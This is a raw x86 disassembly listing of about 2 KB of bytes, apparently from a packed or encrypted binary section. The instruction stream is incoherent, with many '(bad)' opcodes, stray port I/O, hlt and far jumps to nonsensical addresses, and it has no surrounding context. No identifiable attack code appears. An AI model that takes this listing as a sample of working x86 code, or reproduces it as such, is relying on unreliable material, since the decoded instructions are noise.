  416312:	and    DWORD PTR [ebx+ebp*4+0x6a],edx
  416316:	sbb    DWORD PTR [esi+0x5d],edx
  416319:	sahf   
  41631a:	xchg   ch,bl
  41631c:	pop    ebx
  41631d:	neg    DWORD PTR [ebx]
  41631f:	sbb    DWORD PTR [eax],ebx
  416321:	jno    0x4162f3
  416323:	cli    
  416324:	dec    ecx
  416325:	out    0x3c,eax
  416327:	stos   DWORD PTR es:[edi],eax
  416328:	and    ebp,ebp
  41632a:	sbb    ch,BYTE PTR [edx]
  41632c:	addr16 mul bh
  41632f:	cmp    DWORD PTR [ecx],ebx
  416331:	enter  0xa21a,0xa
  416335:	ds aam 0x5
  416338:	push   ebx
  416339:	push   ds
  41633a:	xchg   ebx,eax
  41633b:	in     al,0xb6
  41633d:	in     eax,0x7f
  41633f:	add    al,0xc3
  416341:	jg     0x41637f
  416343:	or     al,0xe9
  416345:	sub    al,0xfa
  416347:	sahf   
  416348:	(bad)
  41634c:	hlt    
  41634d:	js     0x41638c
  41634f:	push   esi
  416350:	add    edi,DWORD PTR [ebp-0x2f]
  416353:	pushf  
  416354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416355:	aas    
  416356:	(bad)  
  416357:	push   ebp
  416358:	adc    al,0x21
  41635b:	ret    0x1211
  41635e:	das    
  41635f:	pop    ss
  416360:	adc    DWORD PTR [ecx+esi*1],ebx
  416363:	mov    dl,0xb9
  416365:	ss inc ecx
  416367:	inc    eax
  416368:	fldpi  
  41636a:	adc    eax,0x35ec33c5
  41636f:	push   edi
  416370:	mov    esi,0x3bdabcaf
  416375:	mov    ?,ebp
  416377:	(bad)  
  416378:	jmp    0x77a9c7e9
  41637d:	inc    BYTE PTR [edx]
  41637f:	jae    0x4163e2
  416381:	dec    edx
  416382:	in     eax,0x43
  416384:	xor    al,0xa9
  416386:	sbb    al,0x96
  416388:	mov    al,0x13
  41638a:	inc    ebp
  41638b:	and    eax,0x56a8a900
  416390:	adc    al,0x65
  416392:	data16 jg 0x416354
  416395:	(bad)  
  416397:	jae    0x416365
  416399:	xor    DWORD PTR [ebx+0xd],0x3df45cde
  4163a0:	fdivrp st(5),st
  4163a2:	pop    ss
  4163a3:	outs   dx,BYTE PTR ds:[esi]
  4163a4:	in     eax,0xc4
  4163a6:	ret    
  4163a7:	std    
  4163a8:	cs adc al,0x20
  4163ab:	dec    esp
  4163ac:	ins    DWORD PTR es:[edi],dx
  4163ad:	outs   dx,DWORD PTR ds:[esi]
  4163ae:	sub    ch,BYTE PTR [ebx+0x2a]
  4163b1:	sub    DWORD PTR [ebx-0x24d4c9c6],ebp
  4163b7:	xor    DWORD PTR [eax-0x20ece9f0],ebp
  4163bd:	jmp    0xda55:0x80b6e45d
  4163c4:	mov    edx,0x2f51839b
  4163c9:	stos   DWORD PTR es:[edi],eax
  4163ca:	mov    dh,0x29
  4163cc:	jge    0x4163da
  4163ce:	mov    edx,DWORD PTR [esp+ecx*8+0x105b3eb0]
  4163d5:	lea    ebp,[eax]
  4163d7:	pop    esp
  4163d8:	and    BYTE PTR [edx],0x9a
  4163db:	xor    BYTE PTR [edx],dl
  4163dd:	jl     0x41635f
  4163df:	div    ebx
  4163e1:	fimul  DWORD PTR [ebp+0x236419b2]
  4163e7:	inc    ebx
  4163e8:	adc    DWORD PTR [eax+edi*4],0xc1b0c6a3
  4163ef:	adc    eax,DWORD PTR [eax+0x638cff9f]
  4163f5:	jns    0x4163f0
  4163f7:	stc    
  4163f8:	mov    ebx,0x6466d5d4
  4163fd:	sbb    eax,0x720aa1b9
  416402:	scas   eax,DWORD PTR es:[edi]
  416403:	aad    0x7f
  416405:	cmp    eax,0x7a4d8c83
  41640a:	or     eax,0x5c49a4fe
  41640f:	push   edi
  416410:	(bad)  
  416411:	push   esi
  416412:	sbb    dh,dh
  416414:	add    edx,edi
  416416:	pop    ss
  416417:	jl     0x416403
  416419:	(bad)  
  41641a:	dec    esp
  41641b:	std    
  41641c:	sahf   
  41641d:	mov    BYTE PTR [edx+esi*2],bl
  416420:	and    BYTE PTR [edi+0x28c85b48],bh
  416426:	iret   
  416427:	out    0x2,al
  416429:	sbb    eax,0xe1a0c3c7
  41642e:	repnz (bad) 
  416430:	test   eax,0x85bee629
  416435:	jecxz  0x41649d
  416437:	gs popa 
  416439:	and    BYTE PTR [eax],cl
  41643b:	adc    BYTE PTR [edx+0x3a],al
  41643e:	dec    esi
  41643f:	(bad)  
  416440:	mov    cl,0x4a
  416442:	mov    BYTE PTR [ebx+0x4b283794],bh
  416448:	jge    0x4163f9
  41644a:	retf   
  41644b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41644c:	sahf   
  41644d:	push   ss
  41644e:	adc    ebx,DWORD PTR [edx+0x6d959950]
  416454:	mov    edx,0x2529e06b
  416459:	nop
  41645a:	retf   0x4265
  41645d:	mov    dl,BYTE PTR [ecx-0x46]
  416460:	jle    0x416409
  416462:	rcl    DWORD PTR [esi+eax*8+0x61b87123],0x16
  41646a:	sub    dh,ah
  41646c:	pop    ecx
  41646d:	and    edi,DWORD PTR [edx+edx*8]
  416470:	push   0x0
  416472:	icebp  
  416473:	ror    eax,0xbf
  416476:	fsubr  DWORD PTR [edi-0x77]
  416479:	test   DWORD PTR [edi],edi
  41647b:	addr16 mov edx,0x26d0cf9b
  416481:	push   edx
  416482:	cmp    DWORD PTR [ebx+ecx*2+0x10d3b447],0xd
  41648a:	push   ds
  41648b:	sbb    al,0xd3
  41648d:	jmp    0x41643e
  41648f:	ret    
  416490:	sub    bh,cl
  416492:	pushf  
  416493:	and    al,0xec
  416495:	clc    
  416496:	and    DWORD PTR [ebx],ecx
  416498:	in     al,0x55
  41649a:	sub    al,0x32
  41649c:	loopne 0x416497
  41649e:	clc    
  41649f:	adc    BYTE PTR [eax],bh
  4164a1:	aaa    
  4164a2:	imul   eax,DWORD PTR [ebx-0x6fa09d75],0x17759b18
  4164ac:	or     edi,ebp
  4164ae:	push   es
  4164af:	push   esi
  4164b0:	push   ds
  4164b1:	sbb    bh,0xb0
  4164b4:	into   
  4164b5:	and    al,0x52
  4164b7:	add    ch,BYTE PTR ds:0x30e122ce
  4164bd:	cwde   
  4164be:	inc    ecx
  4164bf:	retf   
  4164c0:	mov    esp,DWORD PTR [eax-0x4d]
  4164c3:	cmp    al,0x41
  4164c5:	adc    bl,BYTE PTR [ebx+ebp*1]
  4164c8:	xor    BYTE PTR [ebp-0x7f],al
  4164cb:	pop    edx
  4164cc:	xchg   ebx,eax
  4164cd:	xor    dl,BYTE PTR [eax-0x34bf7a7e]
  4164d3:	dec    ebx
  4164d4:	push   ebp
  4164d5:	mov    ds:0x7a813ecc,al
  4164da:	mov    bh,0x3a
  4164dc:	js     0x416488
  4164de:	dec    edx
  4164df:	fst    st(4)
  4164e1:	push   ecx
  4164e2:	add    esi,ebp
  4164e4:	or     BYTE PTR [edx],dh
  4164e6:	(bad)  
  4164e7:	fs in  al,dx
  4164e9:	jle    0x41650f
  4164eb:	jg     0x4164d0
  4164ed:	aas    
  4164ee:	fistp  WORD PTR [eax+esi*8]
  4164f1:	inc    eax
  4164f2:	mov    al,ds:0x61f8dace
  4164f7:	pop    ecx
  4164f8:	sbb    eax,0xc45c07c3
  4164fd:	mov    cs,WORD PTR [esi+0x42]
  416500:	shr    DWORD PTR [edi+0x4a],1
  416503:	in     al,dx
  416504:	mov    esp,0x5b6629e1
  416509:	xchg   ecx,eax
  41650a:	mov    ebx,DWORD PTR [ebp-0x7a573f1a]
  416510:	inc    ebx
  416511:	xor    al,bh
  416513:	push   ebx
  416514:	or     ebp,DWORD PTR [esi+esi*8-0x36]
  416518:	mov    ebp,0x560cee7
  41651d:	in     al,0xa
  41651f:	jns    0x41655a
  416521:	sub    ecx,DWORD PTR [ecx+0x7a]
  416524:	sub    bh,BYTE PTR [eax+ebp*2]
  416527:	jp     0x4165a1
  416529:	lahf   
  41652a:	jge    0x416554
  41652c:	dec    ebx
  41652d:	bound  ebp,QWORD PTR [edi-0x64]
  416530:	idiv   BYTE PTR [edi+0x8]
  416533:	pop    edi
  416534:	outs   dx,BYTE PTR ds:[esi]
  416535:	xchg   ecx,eax
  416536:	lock xor eax,0xe6248bfc
  41653c:	jno    0x416515
  41653e:	fnsave [ecx+0x8e57f16]
  416544:	ret    
  416545:	push   ebx
  416546:	fldenv [edx-0x613e8833]
  41654c:	mov    ebx,0x9d00e346
  416551:	xchg   esi,eax
  416552:	mov    BYTE PTR [ecx-0x1cdf682b],bl
  416558:	sub    edx,esi
  41655a:	mov    dh,0xb
  41655c:	push   0xfb1fbe34
  416561:	push   es
  416562:	fsub   DWORD PTR [edx-0x38c176f2]
  416568:	jp     0x41659f
  41656a:	(bad)  
  41656b:	loope  0x416522
  41656d:	out    dx,eax
  41656e:	ins    DWORD PTR es:[edi],dx
  41656f:	dec    ecx
  416570:	add    dh,ah
  416572:	mov    BYTE PTR [ebx+0x25],ah
  416575:	mov    ebx,ss
  416577:	leave  
  416578:	push   0x64314418
  41657d:	jae    0x41659a
  41657f:	mov    ah,0x94
  416581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416582:	push   es
  416583:	in     al,dx
  416584:	clc    
  416585:	imul   ebp,DWORD PTR [eax+0x60090352],0x4b7c4e7f
  41658f:	push   esi
  416590:	pop    edi
  416591:	xor    BYTE PTR fs:[ecx-0x26],ah
  416595:	or     al,0x5b
  416597:	into   
  416598:	pop    edx
  416599:	add    BYTE PTR [esi-0xa7e80a7],al
  41659f:	xchg   BYTE PTR [esi+edx*2-0x77e3f5a1],dh
  4165a6:	loopne 0x416554
  4165a8:	ja     0x41661b
  4165aa:	jg     0x4165f7
  4165ac:	lods   al,BYTE PTR ds:[esi]
  4165ad:	lahf   
  4165ae:	pop    esi
  4165af:	cmp    al,0xeb
  4165b1:	imul   BYTE PTR [eax-0x6579dbb6]
  4165b7:	(bad)  
  4165b8:	in     eax,dx
  4165b9:	jno    0x41654e
  4165bb:	sbb    ch,BYTE PTR [edi+eiz*8+0x77]
  4165bf:	(bad)  [esi+0xc6c0766]
  4165c5:	sbb    DWORD PTR [eax+0x10],ebx
  4165c8:	repnz adc edi,ecx
  4165cb:	mov    ebx,0x4dbca9af
  4165d0:	jecxz  0x416640
  4165d2:	pop    ebx
  4165d3:	shr    DWORD PTR [ecx-0x76],0x32
  4165d7:	mov    al,ds:0xe5dd93fb
  4165dc:	sbb    eax,DWORD PTR [esi+0x60b45bf]
  4165e2:	fwait
  4165e3:	jo     0x416585
  4165e5:	mov    bh,0x44
  4165e7:	cmc    
  4165e8:	and    eax,DWORD PTR [eax+0x2]
  4165eb:	xchg   edx,eax
  4165ec:	jb     0x416642
  4165ee:	push   ebx
  4165ef:	and    dl,BYTE PTR [edi]
  4165f1:	cmc    
  4165f2:	popf   
  4165f3:	icebp  
  4165f4:	xchg   edi,eax
  4165f5:	fistp  DWORD PTR [ecx-0x27]
  4165f8:	push   ds
  4165f9:	fcom   QWORD PTR [eax-0x7c]
  4165fc:	(bad)  
  4165fe:	pop    ds
  4165ff:	mov    ch,dl
  416601:	ins    BYTE PTR es:[edi],dx
  416602:	and    ebx,ebp
  416604:	mov    al,ds:0x5ba77f0
  416609:	mov    dl,0x4a
  41660b:	in     al,0x2f
  41660d:	inc    esi
  41660e:	pop    ebp
  41660f:	jl     0x416674
  416611:	xor    edi,DWORD PTR [edi-0x7b]
  416614:	xchg   ebp,eax
  416615:	inc    ebp
  416616:	out    0xa4,eax
  416618:	add    DWORD PTR [ebx],edx
  41661a:	stos   BYTE PTR es:[edi],al
  41661b:	push   ebp
  41661c:	cmp    ah,BYTE PTR [edx]
  41661e:	aas    
  41661f:	arpl   WORD PTR [esi-0x34],bx
  416622:	xchg   al,dl
  416624:	xchg   edx,eax
  416625:	or     edi,DWORD PTR [ebx+0x26e66856]
  41662b:	rcr    BYTE PTR [ebp-0x28],0x69
  41662f:	jl     0x416619
  416631:	xchg   ebx,eax
  416632:	push   esi
  416633:	adc    eax,0xa29c848e
  416638:	clc    
  416639:	pop    eax
  41663a:	pusha  
  41663b:	loope  0x4165d2
  41663d:	pushf  
  41663e:	test   eax,0x18160170
  416643:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416645:	les    esi,FWORD PTR [edx-0x8]
  416648:	add    bh,BYTE PTR [ebx+ebp*1-0x44b660cc]
  41664f:	out    0x2a,eax
  416651:	arpl   WORD PTR [ebx+eax*1-0x40d7ffe],sp
  416658:	jno    0x4165f3
  41665a:	pop    edi
  41665b:	les    esp,FWORD PTR [ecx]
  41665d:	fcomp  DWORD PTR [edx-0x1b58af61]
  416663:	sbb    al,0x1d
  416665:	jne    0x41666e
  416667:	nop
  416668:	into   
  416669:	add    eax,0x39597e6e
  41666e:	xchg   ebp,eax
  41666f:	pop    ebx
  416670:	mov    ecx,0xc4010a59
  416675:	cli    
  416676:	push   ss
  416677:	xchg   esp,eax
  416678:	xor    al,0xb6
  41667a:	in     al,dx
  41667b:	xor    cl,BYTE PTR [esi+0x697fd525]
  416681:	add    DWORD PTR [ebx-0x3d],edx
  416684:	mov    bl,0xe5
  416686:	gs popa 
  416688:	lods   eax,DWORD PTR ds:[esi]
  416689:	mov    cl,0x7d
  41668b:	arpl   bx,si
  41668d:	les    edx,FWORD PTR [edx-0x61]
  416690:	lds    ecx,FWORD PTR [eax-0x1f3b8863]
  416696:	lahf   
  416697:	adc    esp,DWORD PTR ds:0x8142329b
  41669d:	cli    
  41669e:	test   dl,cl
  4166a0:	loope  0x416678
  4166a2:	cmp    BYTE PTR [esi+0x715e5f4],dl
  4166a8:	adc    esi,DWORD PTR [ebx]
  4166aa:	hlt    
  4166ab:	fistp  WORD PTR [edx-0x8]
  4166ae:	add    DWORD PTR [esi+0x5223740c],0x5dd86e29
  4166b8:	fcomp  QWORD PTR [eax-0x4f9c97ac]
  4166be:	push   edi
  4166bf:	cwde   
  4166c0:	fisttp QWORD PTR [esi+0x135c56c5]
  4166c6:	loop   0x4166df
  4166c8:	adc    ch,ah
  4166ca:	jg     0x41674b
  4166cc:	aam    0xe4
  4166ce:	dec    edi
  4166cf:	ficom  WORD PTR [esi-0xa]
  4166d2:	cmp    ecx,DWORD PTR [eax]
  4166d4:	outs   dx,DWORD PTR ds:[esi]
  4166d6:	pop    es
  4166d7:	cmp    eax,DWORD PTR [esi+0x960897a]
  4166dd:	hlt    
  4166de:	or     DWORD PTR [ecx+0x5f],edi
  4166e1:	nop
  4166e2:	push   ecx
  4166e3:	adc    ebp,DWORD PTR [edi-0x42]
  4166e6:	fcomp  DWORD PTR [ebp+0x306b10aa]
  4166ec:	aam    0x70
  4166ee:	test   DWORD PTR [esp+esi*2-0x54483ca2],0xcd708fcd
  4166f9:	ins    DWORD PTR es:[edi],dx
  4166fa:	sbb    al,0xea
  4166fc:	mov    ebx,0x72475437
  416701:	inc    ebp
  416702:	xor    DWORD PTR [esi+eax*1],0x56fbc3e5
  416709:	lods   al,BYTE PTR ds:[esi]
  41670a:	in     eax,dx
  41670b:	jns    0x416699
  41670d:	mov    al,0x63
  41670f:	xor    ebp,DWORD PTR [ecx+0x44]
  416712:	in     al,0xf
  416714:	stos   BYTE PTR es:[edi],al
  416715:	add    ch,BYTE PTR [edi+edi*2]
  416718:	imul   eax,DWORD PTR [edi+0x12],0xffffff86
  41671c:	or     DWORD PTR ds:0x22080f0f,ecx
  416722:	sub    DWORD PTR [ebp-0x24],0x6603086c
  416729:	or     eax,0xe1a6b8ef
  41672e:	dec    ebx
  41672f:	add    eax,0x9f0deade
  416734:	jge    0x416732
  416736:	ja     0x416746
  416738:	cmp    esp,eax
  41673a:	dec    ecx
  41673b:	scas   al,BYTE PTR es:[edi]
  41673c:	xchg   ebp,edx
  41673e:	adc    ah,0x34
  416741:	clc    
  416742:	scas   al,BYTE PTR es:[edi]
  416743:	es push 0x33d55dde
  416749:	and    DWORD PTR [ebx+0x58],ebx
  41674c:	jns    0x416730
  41674e:	mov    bl,0x2e
  416750:	xor    bl,BYTE PTR [edi-0x56]
  416753:	and    eax,0xf7a542ff
  416758:	out    0x1b,eax
  41675a:	rcl    DWORD PTR [ebp+0x64095e1d],cl
  416760:	and    eax,0x236f0333
  416765:	repnz cwde 
  416767:	cwde   
  416768:	xchg   edi,eax
  416769:	fs and esp,ebx
  41676c:	cmp    eax,ebp
  41676e:	and    DWORD PTR [eax+0x23504191],esi
  416774:	aad    0x34
  416776:	arpl   WORD PTR [eax+ebp*2],dx
  416779:	pop    ebx
  41677a:	mov    esp,edi
  41677c:	js     0x4167a1
  41677e:	jmp    0x416744
  416780:	add    BYTE PTR [esi+0x6c0c1c05],dl
  416786:	pop    esp
  416787:	iret   
  416788:	push   ebp
  416789:	imul   eax,DWORD PTR [ecx],0x74
  41678c:	cmp    cl,BYTE PTR [edx+0x3e36d1f4]
  416792:	dec    DWORD PTR [ecx-0x6231dd85]
  416798:	je     0x416762
  41679a:	mov    esp,0x6dd0141f
  41679f:	int3   
  4167a0:	push   edx
  4167a1:	in     eax,0xf2
  4167a3:	popf   
  4167a4:	aam    0xd0
  4167a6:	push   ebx
  4167a7:	dec    eax
  4167a8:	outs   dx,BYTE PTR ds:[esi]
  4167a9:	mov    esi,0xcdc94a8f
  4167ae:	hlt    
  4167af:	inc    ebp
  4167b0:	jle    0x4167e1
  4167b2:	add    ecx,esi
  4167b4:	push   es
  4167b5:	jecxz  0x416793
  4167b7:	iret   
  4167b8:	xchg   ecx,eax
  4167b9:	test   BYTE PTR [ebp-0x78],bh
  4167bc:	and    al,0x3e
  4167be:	mov    ebx,0xb12007a4
  4167c3:	mov    ds:0x96da1d5c,al
  4167c8:	sbb    ebx,DWORD PTR ds:0xdacc493d
  4167ce:	stos   DWORD PTR es:[edi],eax
  4167cf:	gs sbb eax,0xc46cb4a0
  4167d5:	mov    ds:0xd19f0588,al
  4167da:	gs ins DWORD PTR es:[edi],dx
  4167dc:	jle    0x4167ba
  4167de:	jp     0x4167e3
  4167e0:	push   ecx
  4167e1:	mov    dl,0x6e
  4167e3:	pop    edx
  4167e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167e5:	jae    0x4167eb
  4167e7:	sub    eax,0x66fd2f60
  4167ec:	imul   ebp,DWORD PTR [esi],0xd8d40d33
  4167f2:	mov    ch,bh
  4167f4:	adc    al,0xa2
  4167f6:	call   0x9f39:0xea81ee5e
  4167fd:	xor    al,0x8c
  4167ff:	jp     0x4167ce
  416801:	rcr    DWORD PTR [edx+0x1f7e64fe],1
  416807:	push   ebp
  416808:	sbb    DWORD PTR [esi-0x31f848c8],edi
  41680e:	sub    BYTE PTR [eax],bh
  416810:	xchg   edx,eax
  416811:	inc    esp
  416812:	cmp    BYTE PTR [esp+edx*8+0x1f30dea5],dl
  416819:	cmc    
  41681a:	arpl   WORD PTR [eax-0x156f76a1],ax
  416820:	lods   eax,DWORD PTR ds:[esi]
  416821:	adc    al,0xb5
  416823:	xor    esi,DWORD PTR [eax+eiz*4-0x4bc5e7c6]
  41682a:	sub    eax,0x41344504
  41682f:	cmp    bl,BYTE PTR [esi]
  416831:	pop    ecx
  416832:	(bad)  
  416833:	aad    0x80
  416835:	mov    bl,0x65
  416837:	(bad)  
  416838:	xchg   ebx,eax
  416839:	jae    0x4167cf
  41683b:	loope  0x41689f
  41683d:	or     ch,cl
  41683f:	mov    esi,0x8ac36791
  416844:	call   0x830b:0xfe1216a6
  41684b:	xor    ah,BYTE PTR [edx]
  41684d:	leave  
  41684e:	mov    esi,0x9f7a667c
  416853:	fcmove st,st(7)
  416855:	sub    al,0x3b
  416857:	lods   al,BYTE PTR ds:[esi]
  416858:	(bad)  [ebx+0x64]
  41685b:	xchg   ecx,eax
  41685c:	mov    ?,WORD PTR [ecx+0x655165ea]
  416862:	push   ds
  416863:	cwde   
  416864:	adc    al,0x98
  416867:	outs   dx,BYTE PTR ds:[esi]
  416868:	imul   esi,DWORD PTR [ebx],0x36c28bfc
  41686e:	fcmovne st,st(1)
  416870:	mov    edx,DWORD PTR ds:0xf7a31eff
  416876:	or     eax,DWORD PTR ds:0xbbd5ebb2
  41687c:	mov    esp,0x9ad9a5c8
  416881:	in     al,0x94
  416883:	inc    esp
  416884:	enter  0x5b5b,0xe5
  416888:	xchg   ecx,eax
  416889:	sbb    al,0x57
  41688c:	inc    ebx
  41688d:	popa   
  41688e:	xor    edx,DWORD PTR [eax+0x7944d5c3]
  416894:	lea    ebp,[ebp-0x7210c0b]
  41689a:	inc    esi
  41689c:	outs   dx,BYTE PTR ds:[esi]
  41689d:	cli    
  41689e:	out    0x56,al
  4168a0:	call   FWORD PTR [esi]
  4168a2:	or     cl,bl
  4168a4:	inc    ecx
  4168a5:	pop    DWORD PTR [ebx+eax*1+0x48]
  4168a9:	dec    ebx
  4168aa:	dec    eax
  4168ab:	lea    edi,ds:0xd2363779
  4168b1:	aas    
  4168b2:	mov    dl,0xdf
  4168b4:	dec    ebx
  4168b5:	int3   
  4168b6:	gs dec ebp
  4168b8:	and    eax,0xa4509542
  4168bd:	in     al,dx
  4168be:	fnstcw WORD PTR [edi-0x6]
  4168c1:	lock std 
  4168c3:	stos   BYTE PTR es:[edi],al
  4168c4:	cdq    
  4168c5:	jge    0x41691e
  4168c7:	dec    eax
  4168c8:	jb     0x416920
  4168ca:	mov    al,0x76
  4168cc:	mov    ah,0xa5
  4168ce:	popf   
  4168cf:	dec    eax
  4168d0:	lock je 0x4168bf
  4168d3:	jbe    0x41692a
  4168d5:	shr    BYTE PTR [ebx],0xc8
  4168d8:	pop    es
  4168d9:	aad    0xa0
  4168db:	push   ss
  4168dc:	mov    BYTE PTR [edi-0x65fd7bd9],bh
  4168e2:	(bad)  
  4168e3:	mov    edi,0x21d67ec3
  4168e8:	cmp    ah,cl
  4168ea:	push   esi
  4168eb:	test   DWORD PTR [esi-0x6],esi
  4168ee:	leave  
  4168ef:	stos   BYTE PTR es:[edi],al
  4168f0:	test   al,0x9f
  4168f2:	arpl   WORD PTR [edx+eiz*2+0x24b7d012],di
  4168f9:	xchg   esi,eax
  4168fa:	(bad)  
  4168fb:	fist   WORD PTR [ebx+ebp*8-0x1e7b3fab]
  416902:	lea    edi,[edx]
  416904:	pop    esp
  416905:	ds out dx,al
  416907:	inc    BYTE PTR [eax+0xd]
  41690a:	or     DWORD PTR [esi],esi
  41690c:	icebp  
  41690d:	jp     0x41695a
  41690f:	or     al,0x28
  416911:	pop    edx
  416912:	pop    ss
  416913:	fmul   QWORD PTR [edi]
  416915:	jno    0x41697d
  416917:	or     ebp,DWORD PTR [eax+ecx*4-0x62e5221d]
  41691e:	ja     0x41694d
  416920:	xchg   bl,ch
  416922:	push   es
  416923:	call   0x23cb279f
  416928:	push   cs
  416929:	adc    eax,0x8312b704
  41692e:	or     ebp,DWORD PTR [ebx+ebx*1]
  416931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416932:	cdq    
  416933:	xchg   edi,eax
  416934:	in     al,0x2e
  416936:	fwait
  416937:	mov    cl,0xfa
  416939:	push   edi
  41693a:	jae    0x4168ff
  41693c:	xor    ecx,DWORD PTR [ebp+0x9]
  41693f:	cmp    DWORD PTR [ebp-0x6431094f],ecx
  416945:	mov    esi,0x201156e2
  41694a:	dec    edi
  41694b:	mov    cl,BYTE PTR [esi-0x694b2283]
  416951:	out    0xf1,eax
  416953:	(bad)  
  416954:	iret   
  416955:	outs   dx,DWORD PTR ds:[esi]
  416956:	aas    
  416957:	sbb    BYTE PTR [eax-0x53],bh
  41695a:	pop    ecx
  41695b:	cmp    esi,DWORD PTR [ecx+0x67]
  41695e:	loope  0x41699b
  416960:	push   ds
  416961:	mov    edx,0x130e42d7
  416966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416967:	mov    eax,0xc636ae33
  41696c:	pop    es
  41696d:	cmp    BYTE PTR [ebx-0x2aa4c621],cl
  416973:	inc    edi
  416974:	ret    0xa2b7
  416977:	ins    BYTE PTR es:[edi],dx
  416978:	jg     0x4168ff
  41697a:	sbb    ecx,ebp
  41697c:	xchg   esp,eax
  41697d:	iret   
  41697e:	adc    DWORD PTR ds:0x3a5a0757,eax
  416984:	dec    esp
  416985:	sub    bh,BYTE PTR [ecx+esi*8+0xa]
  416989:	xchg   bl,al
  41698b:	popa   
  41698c:	je     0x416949
  41698e:	dec    ebp
  41698f:	retf   0x8839
  416992:	xchg   edi,eax
  416993:	(bad)
  416996:	jecxz  0x41692c
  416998:	jo     0x41699f
  41699a:	xor    edx,DWORD PTR [esi-0x55]
  41699d:	xor    BYTE PTR [ebx+0x74d54d2f],0xfe
  4169a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169a6:	rcr    edi,1
  4169a8:	pop    ss
  4169a9:	dec    esp
  4169aa:	push   0x3e
  4169ac:	push   edx
  4169ad:	push   cs
  4169ae:	and    al,0x9b
  4169b0:	enter  0xac5b,0x7e
  4169b4:	adc    DWORD PTR [ebp-0x5361ab37],ebp
  4169ba:	dec    ebp
  4169bb:	jle    0x416a11
  4169bd:	pop    edi
  4169be:	arpl   bp,bx
  4169c0:	cmp    esi,DWORD PTR [ecx]
  4169c2:	jbe    0x416a0c
  4169c4:	adc    ecx,DWORD PTR [esi+ebp*8+0x16bb0cd7]
  4169cb:	xor    DWORD PTR ds:0x795ffdf4,0xffffff9a
  4169d2:	inc    edx
  4169d3:	push   0x6f
  4169d5:	pusha  
  4169d6:	es push cs
  4169d8:	into   
  4169d9:	mov    eax,ds:0xb332dfce
  4169de:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169e1:	dec    esi
  4169e2:	fist   DWORD PTR [ecx+0x2a576749]
  4169e8:	pusha  
  4169e9:	or     esi,DWORD PTR [ebp+0x378bd4e2]
  4169ef:	mov    dl,0x6f
  4169f1:	jbe    0x416a70
  4169f3:	test   DWORD PTR [edi+0x37],esi
  4169f6:	ret    
  4169f7:	out    0xb3,al
  4169f9:	xchg   esp,eax
  4169fa:	jge    0x416a52
  4169fc:	ret    0x562e
  4169ff:	retf   
  416a00:	push   esp
  416a01:	es mov ah,0x65
  416a04:	in     al,0xae
  416a06:	ror    DWORD PTR [edi+0x330322d1],1
  416a0c:	mov    esi,0x837bb8b
  416a11:	cmp    eax,esi
  416a13:	push   ss
  416a14:	into   
  416a15:	jle    0x4169ed
  416a17:	sbb    al,0xed
  416a19:	jne    0x416a72
  416a1b:	or     eax,0xda11ef0c
  416a20:	hlt    
  416a21:	out    0x2,eax
  416a23:	call   0xdb7f282f
  416a28:	sub    edi,DWORD PTR [eax+ebp*4]
  416a2b:	stos   DWORD PTR es:[edi],eax
  416a2c:	sbb    DWORD PTR [eax-0x5cd217f9],ebp
  416a32:	lds    esi,FWORD PTR ss:[edi+0x79]
  416a36:	into   
  416a37:	shr    BYTE PTR [ebx+edi*1+0x33],0x3
  416a3c:	adc    cl,cl
  416a3e:	ins    BYTE PTR es:[edi],dx
  416a3f:	pop    esi
  416a40:	push   es
  416a41:	ret    0x5216
  416a44:	lea    eax,[edi+0x7b]
  416a47:	fs jmp 0xeca67dc8
  416a4d:	into   
  416a4e:	test   DWORD PTR [edx-0x4142494a],edi
  416a54:	outs   dx,BYTE PTR ds:[esi]
  416a55:	xchg   ebx,eax
  416a56:	ret    0x3a09
  416a59:	jnp    0x416aab
  416a5b:	or     al,0x63
  416a5d:	push   eax
  416a5e:	fisubr DWORD PTR [esi]
  416a60:	pop    ecx
  416a61:	push   ecx
  416a62:	int    0x4d
  416a64:	adc    BYTE PTR [ecx],ah
  416a66:	dec    edi
  416a67:	in     al,dx
  416a68:	ins    DWORD PTR es:[edi],dx
  416a69:	ds push ss
  416a6b:	xor    ecx,DWORD PTR [edi+ebx*8-0xf]
  416a6f:	retf   
  416a70:	arpl   ax,di
  416a72:	xchg   esp,eax
  416a73:	in     eax,dx
  416a74:	pop    ss
  416a75:	retf   
  416a76:	into   
  416a77:	das    
  416a78:	mov    ebp,0x95b6b9e8
  416a7d:	es out 0xf9,al
  416a80:	dec    esi
  416a81:	add    ch,BYTE PTR ds:0xcb85778e
  416a87:	es dec ecx
  416a89:	push   edx
  416a8a:	sti    
  416a8b:	inc    ebx
  416a8c:	clc    
  416a8d:	fisttp WORD PTR [edi]
  416a8f:	out    0x91,eax
  416a91:	sbb    bl,BYTE PTR [eax+esi*1]
  416a94:	loopne 0x416af9
  416a96:	pop    es
  416a97:	sar    BYTE PTR [ebp-0x7a66ad2e],cl
  416a9d:	adc    dh,bl
  416a9f:	hlt    
  416aa0:	ja     0x416adb
  416aa2:	mov    al,0x92
  416aa4:	lds    edi,FWORD PTR [eax+0x47a7a19f]
  416aaa:	push   0x6f8745f7
  416aaf:	pushf  
  416ab0:	out    dx,eax
  416ab1:	pop    ds
  416ab2:	data16 hlt 
  416ab4:	repnz shl BYTE PTR [bp+si-0x609e],0x44
  416abb:	data16 mov ds:0xe654ba33,al
  416ac1:	sub    cl,BYTE PTR [esi+0x622899cf]
  416ac7:	fdivr  DWORD PTR [eax+0x4e]
  416aca:	inc    edi
  416acb:	xor    al,BYTE PTR [ebp+0x40]
  416ace:	sub    al,0x5d
  416ad0:	test   BYTE PTR [ebx],dh
  416ad2:	xchg   ebx,eax
  416ad3:	add    al,0xde
  416ad5:	sti    
  416ad6:	cmp    esi,ebx
  416ad8:	ret    
  416ad9:	rcr    DWORD PTR [edi-0x37b779eb],0x2a
  416ae0:	dec    edx
  416ae1:	xor    eax,0x95630036
  416ae6:	ret    
  416ae7:	ror    DWORD PTR [esi-0x33dac291],1
  416aed:	xor    BYTE PTR [ebx-0x5e],bh
